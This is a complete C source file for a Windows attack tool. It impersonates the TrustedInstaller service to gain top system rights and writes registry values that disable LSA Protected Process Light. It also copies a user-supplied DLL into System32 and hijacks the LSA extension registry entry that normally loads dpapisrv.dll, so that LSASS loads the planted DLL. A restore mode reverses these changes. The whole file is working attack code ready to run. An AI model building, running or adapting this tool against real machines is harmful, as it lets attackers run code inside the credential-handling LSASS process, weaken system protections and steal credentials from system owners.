#define UNICODE
#include <Windows.h>
#include <Winternl.h>
#include <Tlhelp32.h>
#include <strsafe.h>
#include <shlwapi.h>
#include <stdio.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")

// ===============================================================================================================================================================================

#define OG_DLL_NAME_TO_SET_1002     L"dpapisrv.dll"

// ===============================================================================================================================================================================

typedef NTSTATUS(NTAPI* fnNtImpersonateThread)(HANDLE ServerThreadHandle, HANDLE ClientThreadHandle, PSECURITY_QUALITY_OF_SERVICE SecurityQos);

// ===============================================================================================================================================================================

VOID PrintErrorMessageW(IN DWORD dwErrorCode) {

    LPWSTR  szMessageBuffer     = NULL;
    DWORD   dwLength            = 0x00;
    
    dwLength = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,                   
        dwErrorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&szMessageBuffer, 
        0x00,                      
        NULL                   
    );

    if (dwLength == 0x00 || szMessageBuffer == NULL) 
    {
		printf("[!] FormatMessageW Failed With Error: %lu\n", GetLastError());
    }
    else 
    {
        while (dwLength > 0x00 && (szMessageBuffer[dwLength - 0x01] == L'\r' || szMessageBuffer[dwLength - 0x01] == L'\n'))
        {
            szMessageBuffer[--dwLength] = L'\0';
        }

		printf("[!] %ws\n", szMessageBuffer);
    }
    
    if (szMessageBuffer)
        LocalFree(szMessageBuffer);
}

// ===============================================================================================================================================================================

BOOL EnablePrivilege(IN LPCWSTR szPrivilegeName) {

    HANDLE				hToken      = NULL;
    TOKEN_PRIVILEGES	TokenPrivs  = { 0 };
    LUID				Luid        = { 0 };
    BOOL 				bResult     = FALSE;

    if (!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid)) {
        printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf("[!] OpenProcessToken Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    TokenPrivs.PrivilegeCount               = 0x01;
    TokenPrivs.Privileges[0].Luid           = Luid;
    TokenPrivs.Privileges[0].Attributes     = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hToken)
        CloseHandle(hToken);
    return bResult;
}
// ===============================================================================================================================================================================

BOOL ImpersonateTrustedInstaller() {

    SC_HANDLE                    hScm               = NULL;
    SC_HANDLE                    hSvc               = NULL;
    THREADENTRY32                ThreadEntry32      = { .dwSize = sizeof(THREADENTRY32) };
    SERVICE_STATUS_PROCESS       ssp                = { 0 };
    DWORD                        dwBytesNeeded      = 0x00,
                                 dwTrustedInstTid   = 0x00;
    HANDLE                       hSnap              = INVALID_HANDLE_VALUE;
    HANDLE                       hTrustedInstThread = NULL;
    BOOL                         bResult            = FALSE;

    if (!(hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT))) {
        wprintf(L"[!] OpenSCManager Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(hSvc = OpenServiceW(hScm, L"TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START))) {
        wprintf(L"[!] OpenService Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &dwBytesNeeded)) {
        wprintf(L"[!] QueryServiceStatusEx [%d] Failed With Error: %lu\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (ssp.dwCurrentState != SERVICE_RUNNING) {
        wprintf(L"[*] TrustedInstaller State [ %u ], Starting Service...\n", ssp.dwCurrentState);
        
        if (!StartServiceW(hSvc, 0x00, NULL)) 
        {
            if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
                wprintf(L"[!] StartService Failed With Error: %lu\n", GetLastError());
                goto _END_OF_FUNC;
            }
        }
        
        do {
            
            Sleep(200);

            if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &dwBytesNeeded)) {
                wprintf(L"[!] QueryServiceStatusEx [%d] Failed With Error: %lu\n", __LINE__, GetLastError());
                goto _END_OF_FUNC;
            }

        } while (ssp.dwCurrentState != SERVICE_RUNNING);
    }

    if (ssp.dwProcessId == 0x00) 
    {
        wprintf(L"[!] Could Not Resolve TrustedInstaller's PID\n");
        goto _END_OF_FUNC;
    }

    wprintf(L"[+] TrustedInstaller PID: %lu\n", ssp.dwProcessId);

    if ((hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0x00)) == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateToolhelp32Snapshot Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }
  
    for (BOOL bOk = Thread32First(hSnap, &ThreadEntry32); bOk; bOk = Thread32Next(hSnap, &ThreadEntry32)) {
        
        if (ThreadEntry32.th32OwnerProcessID == ssp.dwProcessId) 
        {
            dwTrustedInstTid = ThreadEntry32.th32ThreadID;
            break;
        }
    }

    if (!dwTrustedInstTid) {
        wprintf(L"[!] Could Not Resolve TrustedInstaller's TID\n");
        goto _END_OF_FUNC;
    }

    printf("[+] Found TrustedInstaller Thread: %lu\n", dwTrustedInstTid);

    if (!(hTrustedInstThread = OpenThread(THREAD_DIRECT_IMPERSONATION | THREAD_QUERY_INFORMATION, FALSE, dwTrustedInstTid))) {
       wprintf(L"[!] OpenThread Failed For TID %lu With Error: %lu\n", dwTrustedInstTid, GetLastError());
       goto _END_OF_FUNC;
    }

    printf("[+] Opened TrustedInstaller Thread Handle\n");

    {
		NTSTATUS    		            STATUS                  = 0x00;
        HMODULE                         hNtdll                  = NULL;
        fnNtImpersonateThread           pNtImpersonateThread    = NULL;
        SECURITY_QUALITY_OF_SERVICE     ServiceQuality          = 
        {
          .Length                   = sizeof(SECURITY_QUALITY_OF_SERVICE),
          .ImpersonationLevel       = SecurityImpersonation,
          .ContextTrackingMode      = SECURITY_STATIC_TRACKING,
          .EffectiveOnly            = FALSE
        };

		if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
			wprintf(L"[!] GetModuleHandleW Failed With Error: %lu\n", GetLastError());
			goto _END_OF_FUNC;
		}

        if (!(pNtImpersonateThread = (fnNtImpersonateThread)GetProcAddress(hNtdll, "NtImpersonateThread"))) {
            wprintf(L"[!] GetProcAddress Failed With Error: %lu\n", GetLastError());
            goto _END_OF_FUNC;
        }

		if ((STATUS = pNtImpersonateThread((HANDLE)-2, hTrustedInstThread, &ServiceQuality)) != 0x00) {
			wprintf(L"[!] NtImpersonateThread Failed With Status: 0x%08X\n", STATUS);
			goto _END_OF_FUNC;
		}
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hTrustedInstThread)
        CloseHandle(hTrustedInstThread);
    if (hSnap != INVALID_HANDLE_VALUE) 
        CloseHandle(hSnap);
    if (hSvc)        
        CloseServiceHandle(hSvc);
    if (hScm)        
        CloseServiceHandle(hScm);
    return bResult;
}


// ===============================================================================================================================================================================


BOOL EditLsaRegKey(IN LPCWSTR szRegPath, IN LPCWSTR szValueName, IN LPCWSTR szNewDllName) {

    HKEY     hKey        = NULL;
    LSTATUS  Results     = 0x00;
    BOOL     bResult     = FALSE;

    if ((Results = RegOpenKeyExW(HKEY_LOCAL_MACHINE, szRegPath, 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        wprintf(L"[!] RegOpenKeyEx Failed For '%s' With Error: %lu\n", szRegPath, Results);
        goto _END_OF_FUNC;
    }

    printf("[+] Successfully opened '%S'\n", szRegPath);

    if ((Results = RegSetValueExW(hKey, szValueName, 0x00, REG_SZ, (const BYTE*)szNewDllName, (DWORD)((wcslen(szNewDllName) + 1) * sizeof(WCHAR)))) != ERROR_SUCCESS) {
        wprintf(L"[!] RegSetValueExW Failed For '%s' With Error: %lu\n", szValueName, Results);
        goto _END_OF_FUNC;
    }

    wprintf(L"[*] Successfully Set '%s' To '%s'\n", szValueName, szNewDllName);

    RegFlushKey(hKey);

    bResult = TRUE;

_END_OF_FUNC:
    if (hKey)
        RegCloseKey(hKey);
    return bResult;
}

// ===============================================================================================================================================================================

BOOL QueryLsaRegKey(IN LPCWSTR szRegPath, IN LPCWSTR szValueName, OUT LPWSTR* szDllName) {

    HKEY     hKey           = NULL;
    LSTATUS  Results        = 0x00;
    DWORD    dwDllNameLen   = 0x00;
    BOOL     bResult        = FALSE;

    if ((Results = RegOpenKeyExW(HKEY_LOCAL_MACHINE, szRegPath, 0x00, KEY_QUERY_VALUE, &hKey)) != ERROR_SUCCESS) {
        wprintf(L"[!] RegOpenKeyEx Failed For '%s' With Error: %lu\n", szRegPath, Results);
        goto _END_OF_FUNC;
    }

    printf("[+] Successfully opened '%S'\n", szRegPath);

    if ((Results = RegQueryValueExW(hKey, szValueName, NULL, NULL, NULL, &dwDllNameLen)) != ERROR_SUCCESS) {
        wprintf(L"[!] RegQueryValueExW Failed For '%s' With Error: %lu\n", szValueName, Results);
        goto _END_OF_FUNC;
    }

	if (!(*szDllName = (LPWSTR)LocalAlloc(LPTR, dwDllNameLen))) {
		wprintf(L"[!] LocalAlloc Failed With Error: %lu\n", GetLastError());
		goto _END_OF_FUNC;
	}

    if ((Results = RegQueryValueExW(hKey, szValueName, NULL, NULL, (LPBYTE)*szDllName, &dwDllNameLen)) != ERROR_SUCCESS) {
        wprintf(L"[!] RegQueryValueExW Failed For '%s' With Error: %lu\n", szValueName, Results);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hKey)
        RegCloseKey(hKey);
    return bResult;
}

// ===============================================================================================================================================================================


BOOL EditProtectedProcessLight(IN LPCWSTR szRegPath, IN LPCWSTR szValueName, IN DWORD dwNewValue) {
    
    HKEY        hKey           = NULL;
    LSTATUS     Results        = 0x00;
    BOOL        bResult        = FALSE;


    if ((Results = RegOpenKeyExW(HKEY_LOCAL_MACHINE, szRegPath, 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        wprintf(L"[!] RegOpenKeyEx Failed For '%s' With Error: %lu\n", szRegPath, Results);
        goto _END_OF_FUNC;
    }

    printf("[+] Successfully opened '%S'\n", szRegPath);

    if ((Results = RegSetValueExW(hKey, szValueName, 0x00, REG_DWORD, (const BYTE*)&dwNewValue, (DWORD)(sizeof(DWORD)))) != ERROR_SUCCESS) {
        wprintf(L"[!] RegSetValueExW Failed For '%s' With Error: %lu\n", szValueName, Results);
        goto _END_OF_FUNC;
    }

    wprintf(L"[*] Successfully Set '%s' To [%d]\n", szValueName, dwNewValue);
    
    RegFlushKey(hKey);

    bResult = TRUE;

_END_OF_FUNC:
    if (hKey)
        RegCloseKey(hKey);
    return bResult;
}


// ===============================================================================================================================================================================

static inline LPCWSTR GetFileNameW(IN LPCWSTR szPath) 
{
    LPCWSTR p1 = wcsrchr(szPath, L'/');
    LPCWSTR p2 = wcsrchr(szPath, L'\\');
    LPCWSTR pT = (p1 > p2 ? p1 : p2);
    return pT ? pT + 1 : szPath;
}

// ===============================================================================================================================================================================

VOID PrintUsage(IN LPCWSTR argv0)
{
    fwprintf(stderr,
        L"[#] Usage:\n"
        L"  %s --input <dll.path> [--name <dll.name>]\n"
        L"      Copies the specified DLL into System32 and sets registry keys\n"
        L"      --input <dll.path>   : Path to the source DLL (required).\n"
        L"      --name <dll.name>    : Optional name for the DLL in System32\n"
        L"                             (defaults to base name of <dll.path>).\n\n"
        L"  %s --restore\n"
        L"      Removes the deployed DLL from System32 and cleans up registry keys\n\n"
        L"  %s /? or %s -?\n"
        L"      Displays this help message.\n\n"
        L"Examples:\n"
        L"  %s --input Dummy.dll\n"
        L"  %s --input Dummy.dll --name MyDummy.dll\n"
        L"  %s --restore\n\n",
        GetFileNameW(argv0), GetFileNameW(argv0),
        GetFileNameW(argv0), GetFileNameW(argv0),
        GetFileNameW(argv0), GetFileNameW(argv0), GetFileNameW(argv0));
}

// ===============================================================================================================================================================================

BOOL CopyDllToSystem32(IN LPCWSTR szDllPath, IN LPCWSTR szDllName) {


	HRESULT     hResult                 = S_OK;
    WCHAR       szDestPath[MAX_PATH]    = { 0 };

    if (!szDllPath || !szDllName)
        return FALSE;

    if (wcslen(szDllPath) > MAX_PATH || wcslen(szDllName) > MAX_PATH)
        return FALSE;

    if (FAILED((hResult = StringCchPrintfW(szDestPath, MAX_PATH, L"%s\\%s", L"C:\\Windows\\System32", szDllName)))) {
		wprintf(L"[!] StringCchPrintfW Failed With Error: 0x%08X\n", hResult);
		return FALSE;
    }

	// Not forcing overwrite
    if (!CopyFileW(szDllPath, szDestPath, FALSE)) {
        wprintf(L"[!] CopyFileW Failed With Error: %lu\n", GetLastError());
        PrintErrorMessageW(GetLastError());
		return FALSE;
    }

	wprintf(L"[*] Copied '%s' To '%s'\n", szDllPath, szDestPath);
	return TRUE;
}


BOOL DeleteDllFromSystem32(IN LPCWSTR szDllName) {

    HRESULT     hResult                 = S_OK;
	WCHAR       szDestPath[MAX_PATH]    = { 0 };
	
    if (!szDllName)
		return FALSE;
	
    if (wcslen(szDllName) > MAX_PATH)
		return FALSE;

    if (FAILED((hResult = StringCchPrintfW(szDestPath, MAX_PATH, L"%s\\%s", L"C:\\Windows\\System32", szDllName)))) {
        wprintf(L"[!] StringCchPrintfW Failed With Error: 0x%08X\n", hResult);
        return FALSE;
    }
	
    if (!DeleteFileW(szDestPath)) {
		wprintf(L"[!] DeleteFileW Failed With Error: %lu\n", GetLastError());
		PrintErrorMessageW(GetLastError());
		return FALSE;
	}
	
    wprintf(L"[*] Deleted '%s'\n", szDestPath);
	return TRUE;
}


// ===============================================================================================================================================================================



int wmain(int argc, wchar_t* argv[]) {

	DWORD       dwPPLRegValueToSet  = 0x00;
    WCHAR*      szDllNameToSet      = NULL;
    WCHAR*      szDummyDllPath      = NULL;
    WCHAR*      szQueriedDllName    = NULL;
    BOOL        bRestoreMode        = FALSE;

    if (argc == 1)
    {
        PrintUsage(argv[0]);
        return 0;
    }

    if (argc == 2 && (wcscmp(argv[1], L"/?") == 0 || wcscmp(argv[1], L"-?") == 0)) 
    {
        PrintUsage(argv[0]);
        return 0;
    }


    if (!EnablePrivilege(SE_DEBUG_NAME))        return -1;
    if (!EnablePrivilege(SE_IMPERSONATE_NAME))  return -1;

    printf("[*] Enabled SeDebugPrivilege and SeImpersonatePrivilege\n");

    if (!ImpersonateTrustedInstaller())         return -1;

    printf("[*] Impersonated TrustedInstaller\n");

    // Restore mode
    if (argc == 2 && wcscmp(argv[1], L"--restore") == 0) 
    {
		dwPPLRegValueToSet  = 0x02;
		szDllNameToSet      = OG_DLL_NAME_TO_SET_1002;
        bRestoreMode        = TRUE;

        if (!QueryLsaRegKey(
            L"SYSTEM\\CurrentControlSet\\Control\\LsaExtensionConfig\\Interfaces\\1002",
            L"Extension",
            &szQueriedDllName))
        {
            return -1;
        }

        // Only delete if it isn't the original DLL
        if (wcscmp(szQueriedDllName, OG_DLL_NAME_TO_SET_1002) != 0x00)
        {
            DeleteDllFromSystem32(szQueriedDllName);
        }
        else
        {
			wprintf(L"[!] Cant Delete The Original DLL: %s\n", OG_DLL_NAME_TO_SET_1002);
			LocalFree(szQueriedDllName);
        }
    }
    else 
    {
        if (!bRestoreMode)
        {
            for (int i = 1; i < argc; i++)
            {
                if (wcscmp(argv[i], L"--input") == 0 && i + 1 < argc)
                {
                    szDummyDllPath = argv[++i];
                }
                else if (wcscmp(argv[i], L"--name") == 0 && i + 1 < argc)
                {
                    szDllNameToSet = argv[++i];
                }
                else
                {
                    fwprintf(stderr, L"[!] Unknown Parameter: %s\n", argv[i]);
                    PrintUsage(argv[0]);
                    return -1;
                }
            }

            if (!szDummyDllPath)
            {
                fwprintf(stderr, L"[!] --input <dll.path> Is Required\n");
                PrintUsage(argv[0]);
                return -1;
            }

            dwPPLRegValueToSet = 0x00;

            if (!szDllNameToSet)
                szDllNameToSet = GetFileNameW(szDummyDllPath);
            else
			{
				if (wcslen(szDllNameToSet) < 4 || _wcsicmp(szDllNameToSet + wcslen(szDllNameToSet) - 4, L".dll") != 0)
				{
					fwprintf(stderr, L"[!] Input DLL Name Must End With .dll\n");
					return -1;
				}
			}

            if (!CopyDllToSystem32(szDummyDllPath, szDllNameToSet))
            {
                return -1;
            }
        }
    }

    printf("[i] %s PPL Settings...\n", bRestoreMode ? "Enabling" : "Disabling");

	if (!EditProtectedProcessLight(
		L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
		L"IsPplAutoEnabled",
        dwPPLRegValueToSet)) {
		return -1;
	}

	if (!EditProtectedProcessLight(
		L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
		L"RunAsPPL",
        dwPPLRegValueToSet)) {
		return -1;
	}

	if (!EditProtectedProcessLight(
		L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
		L"RunAsPPLBoot",
        dwPPLRegValueToSet)) {
		return -1;
	}

    printf("[i] %s LSA Extension DLL Name ... \n", bRestoreMode ? "Restoring" : "Hijacking");

    if (!EditLsaRegKey(
		L"SYSTEM\\CurrentControlSet\\Control\\LsaExtensionConfig\\Interfaces\\1002",
		L"Extension",
        szDllNameToSet))
	{
		return -1;
	}

    RevertToSelf();

    return 0;
}